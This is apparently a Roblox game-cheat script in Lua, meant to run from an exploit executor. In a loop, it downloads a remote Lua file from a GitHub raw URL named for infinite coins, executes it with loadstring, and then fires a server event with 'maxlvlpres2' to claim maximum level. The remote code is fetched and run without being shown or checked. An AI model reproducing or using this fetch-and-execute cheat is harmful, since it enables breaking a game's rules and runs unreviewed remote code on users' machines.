getgenv().loopLevel = true; -- change to "false" for stop
while getgenv().loopLevel do task.wait()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/KylnDantas/InfRellCoinsSL/main/file.lua"))()
   task.wait(0.50)
   local args = {
       [1] = "maxlvlpres2"
   }
   
   game:GetService("Players").LocalPlayer.startevent:FireServer(unpack(args))
end;